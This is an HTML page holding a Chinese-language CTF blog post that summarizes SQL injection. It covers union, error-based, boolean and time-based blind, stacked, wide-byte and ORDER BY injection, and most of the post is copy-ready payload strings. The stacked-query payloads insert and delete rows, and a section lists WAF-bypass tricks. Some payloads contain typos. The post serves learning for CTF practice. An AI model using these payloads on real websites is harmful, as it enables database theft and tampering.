@@ -1,0 +1,659 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="zhu" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="zhu" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="zhu" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="ctf,总结" />
+
+
+<link rel="canonical" href="http://example.com/2023/01/18/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">
+
+
+
+  <title>
+sql注入总结 |
+ZPY = zhu</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">sql注入总结
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2023-01-18 15:27:39">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-01-18T15:27:39+08:00">2023-01-18</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">ZPY</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclgi503lj20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipetlbztpj20zk0m84qp.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipexj2jgzj20zk0m8b09.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclhfehz7j20zk0m8u0x.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipevo9j1jj20zk0m8e81.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclip4jbpj20zk0m87cv.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/18/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="zhu">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="zhu">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <p>.  sql注入看了好多答案，也看了介绍，就是数据库在输入的时候有漏洞，有些字符没有过滤，导致用户可以注入命令，从而泄露数据库，可能被篡改，窃取，删除内容。我看了看刚接触渗透，浅浅的总结一下sql注入题目一般的解题步骤和常用语句。其实我接触的非常浅。<br>.  总结的时候不咋会，一边搜着教程，一边抄，也给我自己加深印象。</p>
+<h1 id="做题步骤"><a href="#做题步骤" class="headerlink" title="做题步骤"></a>做题步骤</h1><h2 id="寻找sql注入位置"><a href="#寻找sql注入位置" class="headerlink" title="寻找sql注入位置"></a>寻找sql注入位置</h2><ol>
+<li>注入点首先观察搜索框的地址是否是有与数据库交互，例如html这种几乎是不存在注入的所以要先判断是否有交互。</li>
+<li>交互点一般是搜索栏、留言版、登入&#x2F;注册页面、以及最利于观察的搜索栏的地址如果类似于http&#x2F;&#x2F;<span class="exturl" data-url="aHR0cDovL3d3dy54eHguY29tL2luZGV4LnBocD9pZD0xJUU4JUJGJTk5JUU3JUE3JThEJUU1JUJFJTg4JUU1JUE0JUE3JUU3JUE4JThCJUU1JUJBJUE2JUU1JUFEJTk4JUU1JTlDJUE4JUU2JUIzJUE4JUU1JTg1JUE1JUU1JUJEJTkzJUU3JTg0JUI2JUU2JTlDJTg5JUU0JUJBJTlCJUU2JUIzJUE4JUU1JTg1JUE1JUU3JTgyJUI5JUU0JUI4JThEJUU0JUJDJTlBJUU4JUJGJTk5JUU0JUI5JTg4JUU0JUI4JTgwJUU3JTlDJUJDJUU3JTlDJThCJUU1JTg3JUJBJUU0JUJDJTlBJUU2JTlDJTg5JUU0JUJBJTlCJUU2JUFGJTk0JUU4JUJFJTgzJUU1JUE0JThEJUU2JTlEJTgyJUU0JUJFJThCJUU1JUE2JTgyaHR0cDovL3d3dy54eHguY29tOjUwMDA2L2luZGV4LnBocD94PWhvbWUmYz1WaWV3JmE9aW5kZXgmYWlkPTk=">www.xxx.com/index.php?id=1这种很大程度存在注入当然有些注入点不会这么一眼看出会有些比较复杂例如http://www.xxx.com:50006/index.php?x=home&amp;c=View&amp;a=index&amp;aid=9</span> 这样的地址其实也可能存在注入。</li>
+<li>管他什么地址只要结尾是xx&#x3D;1（数字）就注就完事了。</li>
+</ol>
+<h2 id="判断漏洞类型"><a href="#判断漏洞类型" class="headerlink" title="判断漏洞类型"></a>判断漏洞类型</h2><h3 id="按注入点分"><a href="#按注入点分" class="headerlink" title="按注入点分"></a>按注入点分</h3><ol>
+<li><p>字符型<br>字符型注入常于用户或页面url中有?username&#x3D;aaa 或者?password&#x3D;aaa 如：<span class="exturl" data-url="aHR0cDovL3h4eC5jb20vaW5kZXgucGhwP3VzZXJuYW1lPWFhYSZwYXNzd29yZD1iYmIlRUYlQkMlOEMlRTUlQUYlQjklRTQlQkElOEUlRTUlQUQlOTclRTclQUMlQTYlRTUlOUUlOEIlRTYlQjMlQTglRTUlODUlQTUlRUYlQkMlOEMlRTUlQjglQjglRTglQTclODElRTclOUElODQlRTYlODklOEIlRTYlQUUlQjUlRTQlQjglQkElRTklODAlOUElRTglQkYlODclRTklOTclQUQlRTUlOTAlODglRTclQUMlQTYlRTUlOTIlOEMlRTYlQjMlQTglRTklODclOEElRTclQUMlQTYlRTclOUElODQlRTklODUlOEQlRTUlOTAlODglRUYlQkMlOEMlRTclQkIlOTUlRTglQkYlODclRTclOTQlQTglRTYlODglQjclRTUlOTAlOEQlRTUlOTIlOEMlRTUlQUYlODYlRTclQTAlODElRUYlQkMlOEMlRTclOUIlQjQlRTYlOEUlQTUlRTglOEUlQjclRTUlOEYlOTYlRTYlOTUlQjAlRTYlOEQlQUUlRTUlQkElOTMlRTklODclOEMlRTclOUElODQlRTglQjQlQTYlRTUlOEYlQjclRTQlQkYlQTElRTYlODElQUYlRTMlODAlODIlRTUlODklOEQlRTYlOTYlODdodHRwOi8veHh4LmNvbS9pbmRleC5waHA/dXNlcm5hbWU9YWFhJnBhc3N3b3JkPWJiYiVFNyU5QSU4NHNxbCVFOCVBRiVBRCVFNSU4RiVBNSVFNCVCOCVCQXNlbGVjdA==">http://xxx.com/index.php?username=aaa&amp;password=bbb，对于字符型注入，常见的手段为通过闭合符和注释符的配合，绕过用户名和密码，直接获取数据库里的账号信息。前文http://xxx.com/index.php?username=aaa&amp;password=bbb的sql语句为select</span> * from 表 where username&#x3D;‘aaa‘ and password&#x3D;‘bbb‘，而进行字符型注入时，可将url修改成，<span class="exturl" data-url="aHR0cDovL3h4eC5jb20vaW5kZXgucGhwP3VzZXJuYW1lPWFhYQ==">http://xxx.com/index.php?username=aaa</span> ’ and 1&#x3D;1’** *<em>–+</em>***&amp;password&#x3D;bbb，此时通过 ’ 的闭合和–+的注释，生产的sql语句为 select * from 表 where username&#x3D;‘aaa’ and 1&#x3D;1 ’ 由于1&#x3D;1为永真，数据库就可能返回相关信息。</p>
+</li>
+<li><p>数字型<br>数字型注入主要存在于网站的url中有?id&#x3D;处，如：<span class="exturl" data-url="aHR0cDovL3h4eC5jb20vaW5kZXgucGhwP2lkPTE=">http://xxx.com/index.php?id=1</span> 通过改变id&#x3D;的数值来判断是否有注入点，一般常见测试手段是令id等于一个不常见的大数，通过页面是否变化来判断是否存在注入点。可以用?id&#x3D;2-1和?id&#x3D;2的页面变化来判断是否为数字型注入。</p>
+</li>
+<li><p>搜索型注入<br>搜索型相比于数字型和字符型而言，较为特殊点，主要是进行搜索时网站没过滤搜索关键字，常见于url中的 “keyword&#x3D;” 。生成的 SQL 语句：select * from 表 where 字段 like ‘%关键字%’ ，注入时，可以构造sql注入语句：select * from 表名 where 字段 like ‘%关键字%’ and ‘%1%’&#x3D;‘%1%’，进行注入。</p>
+</li>
+</ol>
+<h3 id="按提交方式区分"><a href="#按提交方式区分" class="headerlink" title="按提交方式区分"></a>按提交方式区分</h3><p>访问网站时，浏览器只是一个传输和接收数据的工具，那么就需要将用户的操作生成数据包提交到服务器中。</p>
+<ol>
+<li><p>GET 注入<br>按提交方式区分的话，GET注入是最简单的注入，不需要额外的工具。GET提交数据的方式的特点是将用户操作生成的语句直接显示在url上，常见于不需要保密传输的页面。GET 注入点的位置一般在参数部分。如URL为：<span class="exturl" data-url="aHR0cDovL3h4eC5jb20vaW5kZXgucGhwP2lkPTE=">http://xxx.com/index.php?id=1</span> , id &#x3D;输入的内容可能是注入点。</p>
+</li>
+<li><p>POST 注入<br>使用POST提交的页面通常需要一定的保密性，常见于用户登录页面，用户操作生成的语句不会直接显示在url中，而是会存在于表单中，需要通过抓包才能获取，常用抓包神器BurpSuite，或者可以使用火狐浏览器通过安装hackbar等拓展抓包。抓取数据包后，可以通过修改提交的内容，结合网站页面反馈，判断能否注入。</p>
+</li>
+<li><p>Cookie 注入<br>Cookie，存在用户本地客户端的数据集合，HTTP 请求表单中会带上客户端的 Cookie, 注入点存在 于Cookie 当中的某个字段中。和POST一样，Cookie也要通过抓包来查看。</p>
+</li>
+</ol>
+<h3 id="按页面执行反馈区分"><a href="#按页面执行反馈区分" class="headerlink" title="按页面执行反馈区分"></a>按页面执行反馈区分</h3><p>此种注入主要是因为页面不直接反馈注入操作的内容，而常要配合各种sql函数进行，如sleep(),if（），ascll（）， length（）等，通过页面的反馈情况判断注入操作效果。</p>
+<ol>
+<li><p>布尔注入<br>很多时候，sql服务器并不会直接反馈查询内容，而是通过反馈一个布尔参数给网站服务器，然后再由网站服务器将内容反馈到浏览器，也就是用户眼前，而布尔类型只有两个参数，ture和false，此时可通过配合猜解函数如sleep(),if（），ascll（）， length（）等，来判断注入操作的效果。</p>
+</li>
+<li><p>时间注入<br>和布尔注入一样，由于不直接反馈出入操作的内容，从而通过执行时间来间接猜解注入效果。常用sleep（）、if（）、ascll()的等函数猜解，如：if（length(database()) &#x3D;8,sleep(5),sleep(0)）意为：如果数据库的长度等于8，那么页面休眠5秒，否则不休眠。页面休眠一般指页面处于正在刷新状态。</p>
+</li>
+<li><p>基于报错注入<br>页面反馈操作的错误信息，有的会直接把错误的sql语句反馈在页面中。<br>常见报错注入点在：单&#x2F;双引号、数字型注入</p>
+</li>
+</ol>
+<p>然后针对不同漏洞特点进行sql注入。</p>
+<p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80OTE4MjczNy9hcnRpY2xlL2RldGFpbHMvMTI0OTExNzgw">https://blog.csdn.net/weixin_49182737/article/details/124911780</span></p>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><ol>
+<li>判断字段<br>一般语句：id&#x3D;1’ order by 1,2,3 # 构造闭合语句查询 x从1,2,3,4…逐个尝试，直到试到n时没有回显或回显错误，则字段数为n-1。</li>
+<li>确定回显位置<br>输入id&#x3D;1’ union selsct database(),2,3 #,依次变换函数database()的位置，确定哪个位置会回显出我们所查询的信息。</li>
+<li>爆库名<br>id&#x3D;1’ union selsct database(),2,3 #</li>
+<li>爆表名<br>id&#x3D;1’ union select 1,2,3,table_name from information_schema.tables where table_schema&#x3D;’库名’#</li>
+<li>爆列名<br>id&#x3D;1’ union select 1,2,3,column_name from information_schema.columns where table_name&#x3D;’表名’#</li>
+<li>爆数据值<br>id&#x3D;1’ union select 1,2,3,列名 from 表名#</li>
+</ol>
+<h1 id="sql注入常用语句"><a href="#sql注入常用语句" class="headerlink" title="sql注入常用语句"></a>sql注入常用语句</h1><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><ol>
+<li>判断注入点</li>
+</ol>
+<p>#判断闭合符<br>    ?id&#x3D;1<br>#字符型判断<br>    ?id&#x3D;1’ and ‘1’&#x3D;’1   #页面运行正常<br>    ?id&#x3D;1’ and ‘1’&#x3D;’2   #页面运行不正常<br>#数字型判断<br>    ?id&#x3D;1’ and 1&#x3D;1 – -  #页面运行正常<br>    ?id&#x3D;1’ and 1&#x3D;2 – -  #页面运行不正常</p>
+<pre><code>注入点注入符号 
+引号型注入    &#39;   单引号注入               &quot;双引号注入
+混合型注入    &#39;)  单引号加括号注入   &quot;)双引号加括号注入
+括号注入      ）     括号注入
+</code></pre>
+<p>演示的是字符串注入，通过不同的结果返回，此网站可能存在SQL注入漏洞<br>2. 查询字段</p>
+<pre><code>?id=1&#39; 
+?id=1&#39; order by 3
+?id=1&#39; order by 4
+</code></pre>
+<p>order by查询的是改数据表的字段数量</p>
+<p>访问id&#x3D;1’ order by 3结果与id&#x3D;1结果相同，访问id&#x3D;1’ order by 4结果 与id&#x3D;1结果不相同</p>
+<p>结论：字段数为3<br>3. 确定回显点</p>
+<p>  ?id&#x3D;-1’ union select 1,2,3</p>
+<p>  根据字段数构造语句判断回显<br>4. 基础查询信息</p>
+<p>#查询当前数据库<br>    union select 1,database(),3<br>#查询所有数据库<br>    select group_concat(schema_name)  from  information_schema.schemata<br>#查询指定数据库所有表数据<br>    select group_concat(table_name)  from  information_schema.tables  where  table_schema&#x3D;’security’<br>#查询指定数据库指定表的全部列数据<br>    select group_concat(column_name) from information_schema.columns  where  table_schema&#x3D;’security’  and  table_name&#x3D;’users’<br>#查询指定数据库指定表的部分列数据<br>    select column_name from information_schema.columns  where  table_schema&#x3D;’security’  and  table_name&#x3D;’users’  limit 0,1<br>#查询指定数据库指定表的指定列的字段值<br>    select  group_concat(username,0x3a,password) from  security.users</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>程序把错误信息输入到页面上，利用报错注入获取数据</p>
+<p>‘ and updatexml(1,concat(0x7e,(select user()),0x7e),1)  – +</p>
+<ol>
+<li>substr()函数</li>
+</ol>
+<p>使用substr函数来一段段读取输出的内容</p>
+<p>substr(“123456”,1,5)   #12345</p>
+<ol start="2">
+<li>查询语句</li>
+</ol>
+<p>查询语句与union注入相同，报错只显示一条结果</p>
+<p>#获取 列的字段数<br>    id&#x3D;1’ union select 1,2,3  #回显 you are in…<br>    id&#x3D;1’ union select 1,2,3,4<br>#回显 The used SELECT statements have a different number of columns     </p>
+<p>#获取当前数据库库名<br>    and updatexml(1,concat(0x7e,(select database()),0x7e),1)  – +<br>#获取所有数据库库名<br>    and updatexml(1,concat(0x7e,substring((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1)–+<br>    and updatexml(1,concat(0x7e,substring((select group_concat(schema_name) from information_schema.schemata),32,63),0x7e),1)–+<br>#获取指定数据库的所有表名<br>    and updatexml(1,concat(0x7e,substring((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’),1,31),0x7e),1)–+<br>#获取指定数据库的指定表下的列数据<br>    and updatexml(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.column where table_schema&#x3D;’security’ and table_name&#x3D;’TKbvbxDK’),1,31),0x7e),1)–+<br>#获取指定数据库的指定表名指定列下的字段值<br>    and updatexml(1,concat(0x7e,substring((select group_concat(id,0x3a,flag) from security.TKbvbxDK),64,95),0x7e),1)–+</p>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><ol>
+<li>length( )函数</li>
+</ol>
+<p>判断数据库长度 length()</p>
+<p>‘ and length(database())&gt;&#x3D;1 –+</p>
+<ol start="2">
+<li>substr( )函数</li>
+</ol>
+<p>‘ and substr(database(),1,1)&#x3D;’t’ – +</p>
+<ol start="3">
+<li>ord( )函数</li>
+</ol>
+<p>ord()函数：转换为ascii码</p>
+<p>‘ ord(substr(database(),1,1))&#x3D;115 – +</p>
+<ol start="4">
+<li>查询语句</li>
+</ol>
+<p>#判断数据库长度<br>    and length(database())&#x3D;8 –+<br>    and length(database())&gt;&#x3D;9 –+<br>#指定字符一位一位判断截取到的字符<br>    and substr(database(),1,1)&#x3D;’a’ – +<br>    and substr(database(),2,1)&#x3D;’q’ – +<br>#使用ascii码比对截取到的字符<br>    and ascii(substr(database()1,1))&#x3D;114  – +<br>    and ascii(substr(database()1,1))&#x3D;115  – +<br>#查询表名<br>    and substr((select  table_name  from  information_schema.tables  where  table_schema&#x3D;’security’ limit 0,1 )&#x3D;’e’  – +</p>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><pre><code>GET注入由于id值本身为真，判断注入点使用and运算符
+
+POST注入uname本身为假，判断注入点使用or运算符
+</code></pre>
+<p>判断闭合方式</p>
+<p>and sleep(5)   – -</p>
+<p>判断字段数目  3</p>
+<pre><code>order  by  3
+order  by  4
+</code></pre>
+<p>if(“表达式”,条件1，条件2,) if(1&#x3D;2,1,0)–&gt;0</p>
+<p>if(length(database())&gt;&#x3D;1,sleep(5),1)</p>
+<ol>
+<li>sleep( )延迟函数</li>
+</ol>
+<p>sleep(5) #页面加载延迟5秒</p>
+<p>if(length(database())&gt;&#x3D;1,sleep(5),1)</p>
+<ol start="2">
+<li><p>查询语句</p>
+<p> #判断数据库名称<br> and if(length(database())&#x3D;1,sleep(5),1)  – -<br> and if(length(database())&#x3D;1,sleep(5),1)  – -<br> #使用subsre函数比对截取到的字符<br> and if(substr(database(),1,1)&#x3D;’s’,sleep(5),1)  – +<br> #使用ascii码比对截取到的字符<br> and if(ascii(substr(database(),1,1))&#x3D;115,sleep(5),1)  – +<br> #查询当前数据库下的表数据<br> and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;85,sleep(5),1 – -<br> #查询当前数据库下的指定表数据的列数据<br> and if(ascii(substr((select column_name from information_schema.columns  where  table_schema&#x3D;’security’  and  table_name&#x3D;’8LPD9XiO’  limit 0,1),1,1))&#x3D;105,slepp(5),1 – -<br> #查询当前数据库下的指定表数据的列数据的字段值<br> and  if(ascii(substr((select  group_concat(id,0x3a,flag) from security.8LPD9XiO),1,1))&#x3D;115,1,sleep(5)) –+</p>
+</li>
+</ol>
+<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>‘;select if(substr(user(),1,1)&#x3D;’r’,sleep(3),1)%23</p>
+<p>构造不同的时间注入语句，可以得到完整的数据库的库名，表名，字段名和具体数据</p>
+<ol>
+<li><p>查询语句</p>
+<p> #获得MySQL当前用户<br> ;select if(substr(user(),1,1)&#x3D;’r’,sleep(3),1)%23<br> #获得数据库表名<br> ;select if(substr((select  table_name  from  information_schema.tables  where  table_schema&#x3D;database() limit 0,1),1,1)&#x3D;’e’,sleep(3),1)%23</p>
+</li>
+<li><p>使用联合注入</p>
+</li>
+</ol>
+<p>#判断注入点  单引号注入<br>    ?id&#x3D;1’  and 1&#x3D;1– - HTTP&#x2F;1.1<br>    ?id&#x3D;1’  and 1&#x3D;2– - HTTP&#x2F;1.1<br>#判断字段数目  3<br>    ?id&#x3D;1’  order by 3 – - HTTP&#x2F;1.1<br>    ?id&#x3D;1’  order by 4 – - HTTP&#x2F;1.1  #Unknown column ‘4’ in ‘order clause’<br>#判断回显位  2，3<br>    ?id&#x3D;-1’  union select 1,2,3 – - HTTP&#x2F;1.1<br>#查询当前数据库<br>    ?id&#x3D;-1’  union select 1,database(),3 – - HTTP&#x2F;1.1<br>#查询当前数据库下所有表信息<br>    ?id&#x3D;-1’  union select 1,(select  group_concat(table_name)  from  information_schema.tables  where  table_schema&#x3D;’security’ ),3 – - HTTP&#x2F;1.1<br> #查询当前数据库下指定表下的列信息<br>    ?id&#x3D;-1’  union select 1,(select group_concat(column_name) from information_schema.columns  where  table_schema&#x3D;’security’  and  table_name&#x3D;’users’),3 – - HTTP&#x2F;1.1</p>
+<ol start="3">
+<li>使用堆叠注入向user中插入数据</li>
+</ol>
+<p>#插入用户密码数据<br>    ?id&#x3D;1’;insert into users(id,username,password) values(66,’aiyou’,’bucuo’) –+<br>#插入当前数据库数据<br>    ?id&#x3D;1’;insert into users(id,username,password) values(67,database(),’bucuo’) –+<br>#查询当前数据库信息下方查询方式同等    ?id&#x3D;67<br>    —————————————-<br>#插入查询所有表的所有数据，但数据仍显示不全<br>    ?id&#x3D;1’;insert into users(id,username,password) values(72,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479 ) ,’buuck’) –+<br>#插入当前数据库下的指定表数据<br>    ?id&#x3D;1’;insert into users(id,username,password) values(71,(select table_name from information_schema.tables where table_schema&#x3D;0x7365637572697479 limit 2,1) ,(select table_name from information_schema.tables where table_schema&#x3D;0x7365637572697479 limit 3,1)) –+<br>#插入当前数据库下的指定表数据的列数据<br>    ?id&#x3D;1’;insert into users(id,username,password) values(74,(select column_name from information_schema.columns where table_name&#x3D;”users” limit 13,1) ,(select column_name from information_schema.columns where table_name&#x3D;”users” limit 12,1)) –+<br>#删除数据<br>    ?id&#x3D;1’;delete from users where id&#x3D;74 and sleep(if((select database())&#x3D;0x7365637572697479,5,0));</p>
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><ol>
+<li>查询语句</li>
+</ol>
+<p>#判断是否存在注入<br>    id&#x3D;1%df’ and 1&#x3D;1%23<br>    id&#x3D;1%df’ and 1&#x3D;2%23<br>#查询字段数量   3<br>    id&#x3D;1%df’ order by 3%23<br>    id&#x3D;1%df’ order by 4%23  #Unknown column ‘4’ in ‘order clause’<br>#union注入<br>    id&#x3D;-1%df’ union select 1,2,3%23<br>#查询当前数据库名<br>    id&#x3D;-1%df’ union select 1,database(),3%23<br>#查询所有数据库<br>    select group_concat(schema_name) from information_schema.schemata<br>#查询当前数据库部分表名<br>    select table_name from information_schema.tables where table_schema&#x3D;(select database()) limit 0,1<br>#查询当前数据库所有表名<br>    select group_concat(table_name) from information_schema.tables where table_schema&#x3D;(select database())<br>#查询指定数据库指定表名下的部分列名<br>    select column_name from information_schema.columns where table_schema&#x3D;(select database()) and table_name&#x3D;(select table_name from information_schema.tables where table_schema&#x3D;(select database()) limit 0,1) limit 0,1<br>#查询指定数据库指定表名下的所有列名<br>    select group_concat(column_name) from information_schema.columns where table_schema&#x3D;(select database()) and table_name&#x3D;(select table_name from information_schema.tables where table_schema&#x3D;(select database()) limit 0,1)<br>#查询指定数据库指定表名下的所有列名的字段值<br>    id&#x3D;-1%df’ union select  1,(select group_concat(id,flag) from security.GGXSsnCj),3%23</p>
+<h2 id="order-by-后的注入"><a href="#order-by-后的注入" class="headerlink" title="order by 后的注入"></a>order by 后的注入</h2><p>①直接注入语句，?sort&#x3D;(select )</p>
+<p>②利用一些函数。例如rand()函数等。?sort&#x3D;rand(sql语句)</p>
+<p>③利用and，例如?sort&#x3D;1 and (sql语句)</p>
+<p>④rand(true)和rand(false)结果是不一样的，可以利用这个性质注入</p>
+<p>?sort&#x3D;right(version(),1)</p>
+<ol>
+<li>使用报错注入</li>
+</ol>
+<p>#查询当前用户<br>    ?sort&#x3D;(select extractvalue(0x7e,concat(0x7e,user(),0x7e)))<br>#查询当前数据库<br>    ?sort&#x3D;(select extractvalue(0x7e,concat(0x7e,database(),0x7e)))<br>#查询当前数据库下的部分表数据<br>    ?sort&#x3D;(select extractvalue(0x7e,concat(0x7e,substring((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’),1,31),0x7e)))<br>#查询当前数据库下的指定表的列数据<br>    ?sort&#x3D;(select extractvalue(0x7e,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’TKbvbxDK’),1,31),0x7e)))</p>
+<ol start="2">
+<li><p>使用rand(true)和rand(false)</p>
+<p> ?sort&#x3D;rand(ascii(left(database(),1))&#x3D;115)<br> ?sort&#x3D;rand(ascii(left(database(),1))&#x3D;116)</p>
+</li>
+<li><p>使用延迟注入</p>
+</li>
+</ol>
+<p>#查询当前数据库<br>    ?sort&#x3D;1 and (if(length(database())&gt;2,sleep(5),1) ) – -<br>#查询当前数据库下的表数据<br>    ?sort&#x3D;1 and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 0,1),1,1))&#x3D;100, sleep(5), 1)– +<br>#查询当前数据库下的指定表数据的列数据<br>    ?sort&#x3D; 1 and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),1,1))&gt;100, 0, sleep(5))– +</p>
+<ol start="4">
+<li>使用and</li>
+</ol>
+<p>#查询当前数据库<br>    ?sort&#x3D;1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)  – +<br>#查询当前数据库下的表<br>    ?sort&#x3D;1 and updatexml(1,concat(0x7e,substring((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’),1,31),0x7e),1)  – +</p>
+<p>重点：常见Waf绕过方式</p>
+<ol>
+<li>大小写绕过</li>
+</ol>
+<p>and And or Or<br>2. 双写绕过</p>
+<p>select —–seselectlect</p>
+<p>and—–aandnd</p>
+<p>union—–uunionnion<br>3. 编码绕过</p>
+<p>Hex编码、URL编码、宽字节、Unicode编码<br>编码格式	编码形式<br>URL编码	%66%72%20%31%3d%31(and 1&#x3D;1)<br>Unicode编码	n%u0069on<br>4. 空格绕过方法</p>
+<p>&#x2F;**&#x2F; 、 ()、+、%20、%09、%0a、0x0a、0x0b、0x0c、0x0d<br>5. 等价字符以及等价函数</p>
+<p>and or xor 的过滤</p>
+<pre><code>and =&gt; &amp;&amp;
+
+or =&gt; ||
+
+xor =&gt; ^
+
+not =&gt; !
+</code></pre>
+<ol start="6">
+<li>等价函数</li>
+</ol>
+<p>hex()、 bin()&#x3D;&#x3D;&gt;ascii()</p>
+<p>concat_ws()&#x3D;&#x3D;&gt;group_concat()</p>
+<p>sleep()&#x3D;&#x3D;&gt;benchmark()</p>
+<p>mid()、substr()&#x3D;&#x3D;&gt;substring()</p>
+<p>@@user&#x3D;&#x3D;user()</p>
+<p>@datadir&#x3D;&#x3D;datadir()</p>
+<h2 id="总结主要查询语句"><a href="#总结主要查询语句" class="headerlink" title="总结主要查询语句"></a>总结主要查询语句</h2><pre><code>#爆当前数据库
+select 1,database(),3   
+#爆所有数据库
+select  group_concat(schema_name)  from  information_schema.schemata 
+#爆所有表数据
+select  group_concat(table_name)  from  information_schema.tables  where  table_schema=&#39;security&#39;  
+#爆部分表数据
+select  table_name  from  information_schema.tables  where  table_schema=&#39;security&#39; limit 0,1
+#爆所有字段数据
+select group_concat(column_name) from information_schema.columns  where  table_schema=&#39;security&#39;  and  table_name=&#39;users&#39;
+#爆字段数据
+select column_name from information_schema.columns  where  table_schema=&#39;security&#39;  and  table_name=&#39;users&#39;  limit 0,1
+#爆字段值
+select  group_concat(username,0x3a,password) from  security.users
